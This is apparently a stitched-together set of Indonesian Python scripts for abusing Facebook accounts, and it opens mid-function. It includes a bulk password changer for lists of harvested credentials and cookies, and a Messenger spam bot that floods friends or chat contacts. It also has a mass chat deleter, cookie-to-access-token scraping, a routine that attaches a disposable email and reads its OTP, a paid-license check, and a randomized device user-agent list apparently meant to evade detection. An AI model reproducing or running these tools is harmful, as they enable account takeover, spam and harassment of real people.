	except FileNotFoundError:prints(nel(f'{P2}File tidak ditemukan{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
	for F in id:
		G=F.split(D)[0];I=F.split(D)[1];M=F.split(D)[2];J={'cookie':M};C=E.get('https://mbasic.facebook.com/settings/security/password/?',cookies=J).text;next=re.findall('action\\="(.*?)"',C)[1];N={'fb_dtsg':re.findall('name="fb_dtsg" value="(.*?)"',C),'jazoest':re.findall('name="jazoest" value="(.*?)"',C),'password_change_session_identifier':re.findall('name="password_change_session_identifier" value="(.*?)"',C),'password_old':I,'password_new':B,'password_confirm':B,'save':'Simpan perubahan'};O=E.post('https://mbasic.facebook.com'+str(next),cookies=J,data=N).text
		if'Kata Sandi Telah Diubah'in O:A(f"[+] Password diubah :\033[32m {G}|{B}\033[0m");open('new.txt','a').write(G+D+B+'\n')
		else:print(f'[+] Password gagal :\033[33m {G}|{I}\033[0m')
	prints(nel(f'{P2}Sucsesfully mengubah password secara massall {P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
           
###----------[ AUTHOR ]---------- ###
Author = 'Dapunta Khurayra X'
Version = 0.1
Facebook = 'Facebook.com/Dapunta.Khurayra.X'
Instagram = 'Instagram.com/ratya.anonym.id'

# --> Modules
import requests,bs4,sys,os,datetime,re,time,json
from bs4 import BeautifulSoup as bs
from datetime import datetime

# -->  Clear Terminal
def clear():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")

# --> Ubah Bahasa
def language(cookie):
    try:
        with requests.Session() as xyz:
            req = xyz.get('https://mbasic.facebook.com/language/',cookies=cookie)
            pra = bs(req.content,'html.parser')
            for x in pra.find_all('form',{'method':'post'}):
                if 'Bahasa Indonesia' in str(x):
                    bahasa = {
                        "fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(req.text)).group(1),
                        "jazoest" : re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),
                        "submit"  : "Bahasa Indonesia"}
                    url = 'https://mbasic.facebook.com' + x['action']
                    exec = xyz.post(url,data=bahasa,cookies=cookie)
    except Exception as e:pass

# --> Login
class mmk:
    def __init__(self):
        self.xyz = requests.Session()
        self.cek_cookies()
    def cek_cookies(self):
        try:
            self.token  = open('login/token.json','r').read()
            self.cookie = {'cookie':open('login/cookie.json','r').read()}
            language(self.cookie)
            get  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(self.token),cookies=self.cookie)
            jsx = json.loads(get.text)
            nama = jsx["name"]
           # prints(nel(f'{P2}Login sucses[green] {nama}{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
            auto_chat_messenger()
        except Exception as e:
            self.cookie_invalid()
    def cookie_invalid(self):
        prints(nel(f'{P2}Masukan cookie anda terlebih dahulu biar login{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
        time.sleep(2)
        self.insert_cookie()
    def insert_cookie(self):
        ciko = input('[+] Cookie :\033[32m ')
        toke = self.generate_token(ciko)
        try:os.mkdir("login")
        except:pass
        open('login/cookie.json','w').write(ciko)
        open('login/token.json','w').write(toke)
        self.cek_cookies()
    def generate_token(self,cok):
        try:
            url = 'https://business.facebook.com/business_locations'
            req = self.xyz.get(url,cookies={'cookie':cok})
            tok = re.search('(\["EAAG\w+)', req.text).group(1).replace('["','')
            return(tok)
        except Exception as e:exit(mmk())

class auto_chat_messenger:
    
    # --> Trigger
    def __init__(self):
        self.gagal    = 0
        self.berhasil = 0
        self.for_loop = 0
        self.tararget = []
        self.listchat = []
        self.datapend = {}
        self.all_history = []
        self.xyz = requests.Session()
        self.cookie = {'cookie':open('login/cookie.json','r').read()}
        self.token  = self.generate_token()
        self.menu()

    # --> Generate Token
    def generate_token(self):
        try:
            url = 'https://business.facebook.com/business_locations'
            req = self.xyz.get(url,cookies=self.cookie)
            tok = re.search('(\["EAAG\w+)', req.text).group(1).replace('["','')
            return(tok)
        except Exception as e:prints(nel(f'{P2}Cookie anda invalid{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()

    # --> Main Menu Chat
    def menu(self):	
        prints(nel(f'{P2}[{color_text}01{P2}]. Manual\n[{color_text}02{P2}]. Otomatis (Banyak)\n[{color_text}03{P2}]. Hapus Chat{P2}',title='Menu Spam Chat',width=70,padding=(0,7),style=f"{color_panel}"));xa = input('[+] Chouse : ')
        if xa in ['1','01','a']:
            prints(nel(f'{P2}[{color_text}01{P2}]. Input Target Berdasar ID\n[{color_text}02{P2}]. Pilih Target Dari Riwayat Chat\n[{color_text}03{P2}]. Pilih Target Dari Daftar Teman{P2}',title='Menu Spam Chat Manual',width=70,padding=(0,7),style=f"{color_panel}"))
            xb = input('[+] Chouse : ')
            if   xb in ['1','01','a']: self.manual_input(); self.tulis_chat(); self.jumlah_chat(); self.kalkulasi(); self.sortir()
            elif xb in ['2','02','b']: self.choice_input_scrap('https://mbasic.facebook.com/messages/read'); self.pilih_riwayat_scrap('Dapunta'); self.tulis_chat(); self.jumlah_chat(); self.kalkulasi(); self.sortir()
            elif xb in ['3','03','c']: self.choice_input_graph('https://graph.facebook.com/me?fields=friends.fields(id,name)&limit=5000&access_token='+self.token); self.pilih_riwayat_graph('Dapunta'); self.tulis_chat(); self.jumlah_chat(); self.kalkulasi(); self.sortir()
            else:prints(nel(f'{P2}Pilih yang bener kontol{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
        elif xa in ['2','02','b']:
            prints(nel(f'{P2}[{color_text}01{P2}]. Spam Chat Semua Riwayat Chat\n[{color_text}02{P2}]. Spam Chat Semua Daftar Teman{P2}',title='Menu Spam Chat Otomatis',width=70,padding=(0,7),style=f"{color_panel}"))
            xc = input('[+] Choose : ')
            if   xc in ['1','01','a']: self.choice_input_scrap('https://mbasic.facebook.com/messages/read'); self.pilih_riwayat_scrap('SuciMHR'); self.tulis_chat(); self.jumlah_chat(); self.kalkulasi(); self.sortir()
            elif xc in ['2','02','b']: self.choice_input_graph('https://graph.facebook.com/me?fields=friends.fields(id,name)&limit=5000&access_token='+self.token); self.pilih_riwayat_graph('SuciMHR'); self.tulis_chat(); self.jumlah_chat(); self.kalkulasi(); self.sortir()
            else:prints(nel(f'{P2}Pilih yang bener kontol{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
        elif xa in ['3','03','c']:
            prints(nel(f'{P2}[{color_text}01{P2}]. Hapus Semua Riwayat Chat\n[{color_text}02{P2}]. Hapus Chat Pilihan\n[{color_text}03{P2}]. Hapus Chat Kecuali{P2}',title='Menu Hapus Chat',width=70,padding=(0,7),style=f"{color_panel}"))
            xd = input('[+] Choose : ')
            if   xd in ['1','01','a']: self.choice_input_scrap('https://mbasic.facebook.com/messages/read'); self.pilih_riwayat_scrap('SuciMHR'); self.sortir_delete()
            elif xd in ['2','02','b']: self.choice_input_scrap('https://mbasic.facebook.com/messages/read'); self.pilih_riwayat_scrap('Dapunta'); self.sortir_delete()
            elif xd in ['3','03','c']: self.choice_input_scrap('https://mbasic.facebook.com/messages/read'); self.pilih_riwayat_scrap('Rancay');  self.sortir_delete()
            else:prints(nel(f'{P2}Pilih yang bener kontol{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
        else:
            prints(nel(f'{P2}Pilih yang bener kontol{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()

    # --> Input Manual Berdasar ID
    def manual_input(self):
        prints(nel(f'{P2}Banyak Target? Pisahkan Dengan Koma (,){P2}',width=70,padding=(0,7),style=f"{color_panel}"))
        id  = input('[+] Masukkan ID Target : \033[32m').split(',')
        for x in id:
            self.tararget.append(x) # --> Array ID

    # --> Pilih Berdasar Riwayat Chat
    def choice_input_scrap(self,url):
        try:
            req = bs(self.xyz.get(url,cookies=self.cookie).content,'html.parser')
            for x in req.find_all('h3'):
                try:
                    y = x.find('a',href=True)
                    if str(y) == 'None': pass
                    else:
                        z = re.search('tid=(.*?)&amp',str(y)).group(1).split('.')[2].split('%')[0]
                        self.for_loop += 1
                        print('[%s] %s'%(str(self.for_loop),y.text[:30]))
                        self.all_history.append(z)
                        self.datapend.update({str(self.for_loop):z})
                except Exception as e:pass
            net = 'https://mbasic.facebook.com' + req.find('a',string='Lihat Pesan Sebelumnya')['href']
            self.choice_input_scrap(net)
        except Exception as e:pass
    def pilih_riwayat_scrap(self,tp):
        if tp == 'Dapunta':
            prints(nel(f'{P2}Banyak Target? Pisahkan Dengan Koma (,){P2}',width=70,padding=(0,7),style=f"{color_panel}"))
            xd = input('[+] Username/id :\033[32m ').split(',')
            for x in xd:
                self.tararget.append(self.datapend[x]) # --> Array ID
        elif tp == 'Rancay':
            prints(nel(f'{P2}Kecualikan Chat? Pisahkan Dengan Koma (,){P2}',width=70,padding=(0,7),style=f"{color_panel}"))
            xx = input('[+] Username/id :\033[32m ').split(',')
            for d in xx:
                self.all_history.remove(str(self.datapend[d]))
            self.tararget = self.all_history # --> Array ID
        else:
            self.tararget = self.all_history # --> Array ID
    
    # --> Pilih Berdasar Daftar Teman
    def choice_input_graph(self,url):
        try:
            req = self.xyz.get(url,cookies=self.cookie).json()
            for x in req['friends']['data']:
                try:
                    self.for_loop += 1
                    print('[%s] %s'%(str(self.for_loop),x['name'][:30]))
                    self.all_history.append(x['id'])
                    self.datapend.update({str(self.for_loop):x['id']})
                except Exception as e:pass
        except Exception as e:prints(nel(f'{P2}Teman Tidak Ditemukan{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit() 
    def pilih_riwayat_graph(self,tp):
        if tp == 'Dapunta':
            prints(nel(f'{P2}Banyak Target? Pisahkan Dengan Koma (,){P2}',width=70,padding=(0,7),style=f"{color_panel}"))
            xd = input('[+] Username/id :\033[32m ').split(',')
            for x in xd:
                self.tararget.append(self.datapend[x]) # --> Array ID
        else:
            self.tararget = self.all_history # --> Array ID

    # --> Pilihan Opsi Lain
    def tulis_chat(self):
        prints(nel(f'{P2}Banyak Chat? Pisahkan Dengan (<>){P2}',width=70,padding=(0,7),style=f"{color_panel}"))
        chat = input('[+] Kirim pesan :\033[32m ').split('<>')
        for x in chat:
            self.listchat.append(x) # --> Array Chat
        if len(chat) > 1:self.choice_chat()
        else:self.urut_chat = False
    def jumlah_chat(self):
        prints(nel(f'{P2}Masukan jumlah kelipatan chat anda{P2}',width=70,padding=(0,7),style=f"{color_panel}"));self.jc = input('[+] Jumlah Kelipatan Tiap Chat : ') # --> Jumlah Masing² Chat
    def choice_chat(self):
        prints(nel(f'{P2}[{color_text}01{P2}]. A, B, A, B, A, B\n[{color_text}02{P2}]. A, A, A, B, B, B{P2}',title='Pilih urutan chat',width=70,padding=(0,7),style=f"{color_panel}"))
        xd = input('[+] Choose : ')
        if   xd in ['1','01','a']: self.urut_chat = 'bolak'
        elif xd in ['2','02','b']: self.urut_chat = 'balik'
        else:prints(nel(f'{P2}Pilih yang bener kontol{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
    def kalkulasi(self):
        prints(nel(f'{P2}Jenis Chat: [green]{str(len(self.listchat))}\n[white]Jumlah Penerima:[green] {str(len(self.tararget))}\n[white]Jumlah Kelipatan Chat: [green]{str(int(self.jc))}\n[white]Total[green] {str(len(self.listchat)*len(self.tararget)*int(self.jc))}[white] Chat Akan dikirim{P2}',title='Kalkulasi',width=70,padding=(0,7),style=f"{color_panel}"))
   #     print('[+] Jenis Chat            : %s'%(str(len(self.listchat))))
    #    print('[+] Jumlah Penerima       : %s'%(str(len(self.tararget))))
   #     print('[+] Jumlah Kelipatan Chat : %s'%(str(int(self.jc))))
  #      print('[+] Total %s Chat Akan Dikirim\n'%(str(len(self.listchat)*len(self.tararget)*int(self.jc))))

    # --> Sortir Chat & Target
    def sortir(self):
        if self.urut_chat == 'balik':
            for x in self.tararget:
                self.perorangan_berhasil = 0
                self.perorangan_gagal    = 0
                for y in self.listchat:
                    for s in range(int(self.jc)):
                        self.exec(x,y)
                try:
                    print('\r[+] Spam Chat \033[32m%s \033[0m                     '%(self.nama[:20]))
                    print('\r   • Berhasil : \033[32m%s\033[0m                      '%(str(self.perorangan_berhasil)))
                    print('\r   • Gagal    : \033[32m%s   \033[0m                   '%(str(self.perorangan_gagal)))
                    print('\r')
                except Exception as e:pass
        else:
            for x in self.tararget:
                self.perorangan_berhasil = 0
                self.perorangan_gagal    = 0
                for s in range(int(self.jc)):
                    for y in self.listchat:
                        self.exec(x,y)
                try:
                    print('\r[+] Spam Chat \033[32m%s   \033[0m                   '%(self.nama[:20]))
                    print('\r   • Berhasil :\033[32m %s \033[0m                     '%(str(self.perorangan_berhasil)))
                    print('\r   • Gagal    : \033[32m%s\033[0m                      '%(str(self.perorangan_gagal)))
                    print('\r')
                except Exception as e:pass

    # --> Requests Post Message
    def exec(self,id,cet):
        url = 'https://mbasic.facebook.com/messages/thread/'+id
        try:
            req = bs(self.xyz.get(url,cookies=self.cookie).content,'html.parser')
            fom = req.find('form',{'method':'post'})
            try:
                data = {
                    'fb_dtsg'      : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(fom)).group(1),
                    'jazoest'      : re.search('name="jazoest" type="hidden" value="(.*?)"',str(fom)).group(1),
                    'tids'         : re.search('name="tids" type="hidden" value="(.*?)"',   str(fom)).group(1),
                    'csid'         : re.search('name="csid" type="hidden" value="(.*?)"'   ,str(fom)).group(1),
                    'cver'         : 'legacy',
                    'ids[%s]'%(id) : id,
                    'wwwupp'       : 'C3',
                    'platform_xmd' : ''}
            except Exception as e:
                data = {
                    'fb_dtsg'      : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(fom)).group(1),
                    'jazoest'      : re.search('name="jazoest" type="hidden" value="(.*?)"',str(fom)).group(1),
                    'ids[%s]'%(id) : id}
            data.update({'body':cet,'send':'Kirim'})
            nek = 'https://mbasic.facebook.com' + fom['action']
            cuy = bs(self.xyz.post(nek,data=data,cookies=self.cookie).content,'html.parser').find('title').text
            if cuy == 'Kesalahan':
                self.gagal += 1
                self.perorangan_gagal += 1
                print('\r[Proses] [Berhasil:\033[32m%s\033[0m] [Gagal:\033[31m%s\033[0m]'%(str(self.berhasil),str(self.gagal)),end='');sys.stdout.flush()
            else:
                self.berhasil += 1
                self.perorangan_berhasil += 1
                self.nama = cuy
                print('\r[Proses] [Berhasil:\033[32m%s\033[0m] [Gagal:\033[31m%s\033[0m]'%(str(self.berhasil),str(self.gagal)),end='');sys.stdout.flush()
        except Exception as e:pass

    # --> Delete Chat
    def sortir_delete(self):
        self.delchat = 0
        for id in self.tararget:
            url = 'https://mbasic.facebook.com/messages/thread/'+id
            self.delete1(url)
    def delete1(self,url):
        try:
            req = bs(self.xyz.get(url,cookies=self.cookie).content,'html.parser')
            fom = req.find_all('form',{'method':'post'})[1]
            data = {
                'fb_dtsg'      : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(fom)).group(1),
                'jazoest'      : re.search('name="jazoest" type="hidden" value="(.*?)"',str(fom)).group(1),
                'delete'       : 'Hapus'}
            nek = 'https://mbasic.facebook.com' + fom['action']
            self.delete2(nek,data)
        except Exception as e:pass
    def delete2(self,url,data):
        try:
            req = bs(self.xyz.post(url,data=data,cookies=self.cookie).content,'html.parser')
            got = req.find('a',string='Hapus')['href']
            nok = 'https://mbasic.facebook.com'+got
            roq = bs(self.xyz.get(nok,cookies=self.cookie).content,'html.parser')
            self.delchat += 1
        except Exception as e:
            pass
        print('\r[+] Berhasil Menghapus %s Chat'%(str(self.delchat)),end='');sys.stdout.flush()
        
# MODULE
import os
import re
import sys
import requests
from bs4 import BeautifulSoup as bs

try:
	from fake_email import Email
except:
	os.system('pip install fake_email')
	from fake_email import Email


# COLOR
p  = '\33[m' 		# DEFAULT
m  = '\x1b[0;91m' 	# RED 
k  = '\033[0;93m' 	# KUNING 
h  = '\x1b[0;92m' 	# HIJAU 



# CLASS TAMBAH GMMAIL
class plus_email:
	def __init__(self):
		prints(nel(f'{P2} Silahkan anda menggunakan cookie/password{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		self.cookie = input('[+] Cookie :\033[32m ')
		self.pw = pwinput('\033[0m[+] Masukan password : ')
		self.add_mail()


	def add_mail(self):
		create = Email().Mail()
		email = create['mail']
		self.email_post = create['mail']
		self.email_ses = create["session"]
		#print(' berhasil membuat fake_email')
		get = bs(ses.get('https://mbasic.facebook.com/settings/email/add?', cookies={'cookie': self.cookie}).text, 'html.parser')
		form = get.find('form', {'method': 'post'})
		if 'masukkan kata sandi Facebook Anda' in str(form):
			data = {
				'add_email':	'1',
				'c':	'',
				'email':	email,
				'fb_dtsg':	re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(form)).group(1),
				'jazoest':	re.search('name="jazoest" type="hidden" value="(.*?)"',str(form)).group(1),
				'qp_h':	'',	
				'qp_id':	'',
				'save':	re.search('name="save" size="0" type="submit" value="(.*?)"',str(form)).group(1),
				'save_password':	self.pw,
				'source_added':	'm_settings'
			}
		else:
			data = {
				'add_email':	'1',
				'c':	'',
				'email':	email,
				'fb_dtsg':	re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(form)).group(1),
				'jazoest':	re.search('name="jazoest" type="hidden" value="(.*?)"',str(form)).group(1),
				'qp_h':	'',	
				'qp_id':	'',
				'save':	re.search('name="save" size="0" type="submit" value="(.*?)"',str(form)).group(1),
				'source_added':	'm_settings'
			}

		action = re.search('action="(.*?)"',str(form)).group(1).replace('amp;','')
		if 'https' in action:
			url = re.search('action="(.*?)"',str(form)).group(1).replace('amp;','')
		else:
			url = 'https://mbasic.facebook.com'+re.search('action="(.*?)"',str(form)).group(1).replace('amp;','')
		post = bs(ses.post(url, data=data, cookies={'cookie': self.cookie}).text, 'html.parser')
		
		if 'Menunggu Persetujuan' in str(post):
			prints(nel(f'{P2}Berhasil menambahkan fake_email, Tunggu sedang menunggu otp....{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
			self.url_code = re.search('a href="/entercode.php(.*?)"',str(post)).group(1).replace('amp;','')
			self.confirmasi()
		elif 'Anda Diblokir Sementara' in str(post):
			prints(nel(f'{P2}Acc terkena spam{P2}',width=70,padding=(0,7),style=f"{color_panel}"));
		else:
			prints(nel(f'{P2}Gagal bro{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
			pass

	def confirmasi(self):
		url = 'https://mbasic.facebook.com/entercode.php'+self.url_code
		get = bs(ses.get(url, cookies={'cookie': self.cookie}).text, 'html.parser')
		form = get.find('form', {'method': 'post'})
		#prints(nel(f'{P2} Tunggu sedang menunggu otp{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		while True:
			mass=Email(self.email_ses).inbox()
			if mass:
				code = re.search('konfirmasi ini: (.*?).<',mass['message']).group(1)
				print('[+] OTP anda :\033[32m '+re.search('konfirmasi ini: (.*?).<',mass['message']).group(1))
				break
		data = {
			'code':	code,
			'email':	self.email_post,
			'fb_dtsg':	re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(form)).group(1),
			'jazoest':	re.search('name="jazoest" type="hidden" value="(.*?)"',str(form)).group(1),
		}
		post = ses.post('https://mbasic.facebook.com'+re.search('action="(.*?)"',str(form)).group(1).replace('amp;',''), data=data, cookies={'cookie': self.cookie})
		if post.status_code == 200:
			prints(nel(f'{P2}Berhasil konfirmasi email: [green]{self.email_post}{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		else:
			prints(nel(f'{P2}Gagal konfirmasi email:[green] {self.email_post}{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
kentod = random.choice(["KHRHE-UKDM-UOFJR-LBRJ","MORHE-UUQDM-OOFJR-IBRJZ","LIMPL-XDZGC-NNVDR-NXGXK","LHEZL-RPKJG-IPPOR-YWXGV","JOJQR-GKFVW-VLYJT-UNITI","GSNEP-NTRCE-CTKYK-OIAGD","LTQVM-NRQSC-LVJCL-SVQTD","HCYUY-ADXUB-MPCVJ-DGNQE","JHSQH-YAYOT-WDWFU-FAYIV","MTIRZ-YXKRT-ZEYGN-UWJMK","LWGOO-ZPRNJ-FKDXT-YNBZB","GTSCS-MEXZL-YXMLX-NLUCT","KWQRM-ROFYY-YLBST-BKXAE","LISBX-TPVSB-WXKEV-XOMIB","JVFEN-WKCFP-XLLXV-GAKUS","LEHBK-GBLHK-NACGN-EEHUW","KAEPL-IBDPP-WQYGN-PMUSI","KVIZG-ILJVO-EKFYT-THGKZ"])
kentodd=random.choice([kentod])
crot=(kentodd)

def getkey():
    import json, requests
    try:
        openkey = open(".key.txt","r").read()
        files = openkey.split("\n")[1]
        key = openkey.split("\n")[0]
    except FileNotFoundError:
        os.system("clear")
        banner();time.sleep(1)
        print("[+] Status \033[32mNotlisensi\033[0m")
        prints(nel(f'{P2}License Anda Tidak Tersedia Jika Mau Beli Liat Dibawah{P2}',width=70,padding=(0,7),style=f"{color_panel}"));time.sleep(2)
        print('[+] List Harganya :')
        prints(nel(f'{P2}- Open source 500k\n- 1 minggu 30\n- 2 minggu 60k\n- 3 minggu 90k\n- 1 bulan 130k\n- Permanen 250k enc Full Update{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
        prints(nel(f'{P2}License Anda : {H2}{crot}{P2}',title='[white]ISI NAMA ANDA TANPA PAKAI SPASI',width=70,padding=(0,7),style=f"{color_panel}"));time.sleep(1)
        namamu = input("\033[0m[+] Nama anda :\033[32m ")
        prints(nel(f'{P2}Note : kalau mau beli ketik "{H2}y{P2}" kalau gak mau ketik "{H2}t{P2}" {P2}',width=70,padding=(0,7),style=f"{color_panel}"))
        yt = input("[+] Beli Lisensi : \033[32m")
        if yt in ["Y","y"]:
            prints(nel(f'{P2}Keyname anda : {H2}{crot}{P2} - {H2}{namamu}{P2} tunggu sebentar akan diarahkan ke WhatsApp\nNote : {M2} Jika anda sudah di konfirmasi silahkan tunggu 5 menit, setelah 5 menit lalu jalankan ulang scriptnya terimakasih.{P2}',width=70,padding=(0,7),style=f"{color_panel}"));time.sleep(3);os.system("xdg-open https://wa.me/+6289530656600?text=Assalamualaikum+bang+AsepitgansXc,+aku+mau+beli+scriptnya+tapi+yang+versi+premium.+Ini+lisensinya:%20"+crot+"+konfitmasi+nama+pembeli:%20"+namamu)
            open(".key.txt","w").write(crot+"\n"+namamu);exit()
        else:
        	prints(nel(f'{P2}Lisensi telah keluar dari program{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
    try:
        confirmkey = requests.get("https://raw.githubusercontent.com/data-asepitgans/database/main/data.json").json()
    except requests.exceptions.ConnectionError:
    	prints(nel(f'{P2}Jaringan Internet Kamu Tidak Ada{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
    if confirmkey[files] == key:
        if confirmkey[files] == "tidakada":
        	prints(nel(f'{P2}Lisensi key Kamu Sudah Kadaluarsa{P2}',width=70,padding=(0,7),style=f"{color_panel}"));os.system("rm .key.txt");exit()
        else:
        	prints(nel(f'{P2}Welcome{H2} premium,{P2} Lisensi key Kamu Sudah Aktif{P2}',width=70,padding=(0,7),style=f"{color_panel}"));time.sleep(1);login()
    else:
    	prints(nel(f'{P2}Lisensi key Kamu Sudah Kadaluarsa{P2}',width=70,padding=(0,7),style=f"{color_panel}"));os.system("rm .key.txt");exit()
    
    

ugen7 = []
for xd in range(1000):
    rr = random.randint
    rc = random.choice
    aZ = str(
        rc(
            [
                "A",
                "B",
                "C",
                "D",
                "E",
                "F",
                "G",
                "H",
                "I",
                "J",
                "K",
                "L",
                "M",
                "N",
                "O",
                "P",
                "Q",
                "R",
                "S",
                "T",
                "U",
                "V",
                "W",
                "X",
                "Y",
                "Z",
            ]
        )
    )
    lonte = f"{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}"
    vivo = [
        "V2011A",
        "V1932A",
        "V2206",
        "V2201",
        "V2143",
        "V1950A",
        "Y55A",
        "V2104",
        "V2221",
        "V2158",
        "V2203A",
        "V2172A",
        "V1818A",
        "1904",
    ]
    oppo = [
        "CNM632",
        "CPH1869",
        "CPH1929",
        "CPH2107",
        "CPH2238",
        "CPH2351",
        "CPH2389",
        "CPH2407",
        "CPH2417",
        "CPH2419",
        "CPH2451",
        "CPH2455",
        "CPH2461",
        "CPH8893",
        "CPH1909",
    ]
    redmi = [
        "2201116SI",
        "M2012K11AI",
        "22011119TI",
        "21091116UI",
        "M2102K1AC",
        "M2012K11I",
        "22041219I",
        "22041216I",
        "2203121C",
        "2106118C",
        "2201123G",
        "2203129G",
        "2201122G",
        "2201122C",
        "2206122SC",
        "22081212C",
        "2112123AG",
        "2112123AC",
        "2109119BC",
        "M2002J9G",
        "M2007J1SC",
        "M2007J17I",
        "M2102J2SC",
        "M2007J3SY",
        "M2007J17G",
        "M2007J3SG",
        "M2011K2G",
        "M2101K9AG ",
        "M2101K9R",
        "2109119DG",
        "M2101K9G",
        "2109119DI",
        "M2012K11G",
        "M2102K1G",
        "21081111RG",
        "2107113SG",
        "21051182G",
        "M2105K81AC",
        "M2105K81C",
        "21061119DG",
        "21121119SG",
        "22011119UY",
        "21061119AG",
        "21061119AL",
        "22041219NY",
        "22041219G",
        "21061119BI",
        "220233L2G",
        "220233L2I",
        "220333QNY",
        "220333QAG",
        "M2004J7AC",
        "M2004J7BC",
        "M2004J19C",
        "M2006C3MII",
        "M2010J19SI",
        "M2006C3LG",
        "M2006C3LVG",
        "M2006C3MG",
        "M2006C3MT",
        "M2006C3MNG",
        "M2006C3LII",
        "M2010J19SL",
        "M2010J19SG",
        "M2010J19SY",
        "M2012K11AC",
        "M2012K10C",
        "M2012K11C",
        "22021211RC",
    ]
    realme = [
        "RMX3516",
        "RMX3371",
        "RMX3461",
        "RMX3286",
        "RMX3561",
        "RMX3388",
        "RMX3311",
        "RMX3142",
        "RMX2071",
        "RMX1805",
        "RMX1809",
        "RMX1801",
        "RMX1807",
        "RMX1803",
        "RMX1825",
        "RMX1821",
        "RMX1822",
        "RMX1833",
        "RMX1851",
        "RMX1853",
        "RMX1827",
        "RMX1911",
        "RMX1919",
        "RMX1927",
        "RMX1971",
        "RMX1973",
        "RMX2030",
        "RMX2032",
        "RMX1925",
        "RMX1929",
        "RMX2001",
        "RMX2061",
        "RMX2063",
        "RMX2040",
        "RMX2042",
        "RMX2002",
        "RMX2151",
        "RMX2163",
        "RMX2155",
        "RMX2170",
        "RMX2103",
        "RMX3085",
        "RMX3241",
        "RMX3081",
        "RMX3151",
        "RMX3381",
        "RMX3521",
        "RMX3474",
        "RMX3471",
        "RMX3472",
        "RMX3392",
        "RMX3393",
        "RMX3491",
        "RMX1811",
        "RMX2185",
        "RMX3231",
        "RMX2189",
        "RMX2180",
        "RMX2195",
        "RMX2101",
        "RMX1941",
        "RMX1945",
        "RMX3063",
        "RMX3061",
        "RMX3201",
        "RMX3203",
        "RMX3261",
        "RMX3263",
        "RMX3193",
        "RMX3191",
        "RMX3195",
        "RMX3197",
        "RMX3265",
        "RMX3268",
        "RMX3269",
        "RMX2027",
        "RMX2020",
        "RMX2021",
        "RMX3581",
        "RMX3501",
        "RMX3503",
        "RMX3511",
        "RMX3310",
        "RMX3312",
        "RMX3551",
        "RMX3301",
        "RMX3300",
        "RMX2202",
        "RMX3363",
        "RMX3360",
        "RMX3366",
        "RMX3361",
        "RMX3031",
        "RMX3370",
        "RMX3357",
        "RMX3560",
        "RMX3562",
        "RMX3350",
        "RMX2193",
        "RMX2161",
        "RMX2050",
        "RMX2156",
        "RMX3242",
        "RMX3171",
        "RMX3430",
        "RMX3235",
        "RMX3506",
        "RMX2117",
        "RMX2173",
        "RMX3161",
        "RMX2205",
        "RMX3462",
        "RMX3478",
        "RMX3372",
        "RMX3574",
        "RMX1831",
        "RMX3121",
        "RMX3122",
        "RMX3125",
        "RMX3043",
        "RMX3042",
        "RMX3041",
        "RMX3092",
        "RMX3093",
        "RMX3571",
        "RMX3475",
        "RMX2200",
        "RMX2201",
        "RMX2111",
        "RMX2112",
        "RMX1901",
        "RMX1903",
        "RMX1992",
        "RMX1993",
        "RMX1991",
        "RMX1931",
        "RMX2142",
        "RMX2081",
        "RMX2085",
        "RMX2083",
        "RMX2086",
        "RMX2144",
        "RMX2051",
        "RMX2025",
        "RMX2075",
        "RMX2076",
        "RMX2072",
        "RMX2052",
        "RMX2176",
        "RMX2121",
        "RMX3115",
        "RMX1921",
    ]
    infinix = [
        "X676B",
        "X687",
        "X609",
        "X697",
        "X680D",
        "X507",
        "X605",
        "X668",
        "X6815B",
        "X624",
        "X655F",
        "X689C",
        "X608",
        "X698",
        "X682B",
        "X682C",
        "X688C",
        "X688B",
        "X658E",
        "X659B",
        "X689B",
        "X689",
        "X689D",
        "X662",
        "X662B",
        "X675",
        "X6812B",
        "X6812",
        "X6817B",
        "X6817",
        "X6816C",
        "X6816",
        "X6816D",
        "X668C",
        "X665B",
        "X665E",
        "X510",
        "X559C",
        "X559F",
        "X559",
        "X606",
        "X606C",
        "X606D",
        "X623",
        "X624B",
        "X625C",
        "X625D",
        "X625B",
        "X650D",
        "X650B",
        "X650",
        "X650C",
        "X655C",
        "X655D",
        "X680B",
        "X573",
        "X573B",
        "X622",
        "X693",
        "X695C",
        "X695D",
        "X695",
        "X663B",
        "X663",
        "X670",
        "X671",
        "X671B",
        "X672",
        "X6819",
        "X572",
        "X572-LTE",
        "X571",
        "X604",
        "X610B",
        "X690",
        "X690B",
        "X656",
        "X692",
        "X683",
        "X450",
        "X5010",
        "X501",
        "X401",
        "X626",
        "X626B",
        "X652",
        "X652A",
        "X652B",
        "X652C",
        "X660B",
        "X660C",
        "X660",
        "X5515",
        "X5515F",
        "X5515I",
        "X609B",
        "X5514D",
        "X5516B",
        "X5516C",
        "X627",
        "X680",
        "X653",
        "X653C",
        "X657",
        "X657B",
        "X657C",
        "X6511B",
        "X6511E",
        "X6511",
        "X6512",
